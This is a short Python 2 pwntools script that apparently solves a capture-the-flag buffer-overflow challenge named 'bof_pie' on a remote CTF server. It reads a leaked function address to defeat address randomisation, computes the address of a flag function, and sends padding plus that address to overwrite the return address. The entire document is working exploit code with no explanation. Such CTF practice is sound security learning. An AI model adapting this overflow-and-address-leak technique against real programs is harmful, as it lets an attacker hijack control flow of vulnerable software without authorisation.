from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3008)
#p = process('./bof_pie')

print p.recvuntil('is ')
welcome_addr = int(p.recv(),16)
flag_addr = welcome_addr - 0x79

payload = ''
payload += 'a'*0x12 + 'b'*0x4
payload += p32(flag_addr)

p.sendline(payload)

print p.recv(1024)
print p.recv(1024)


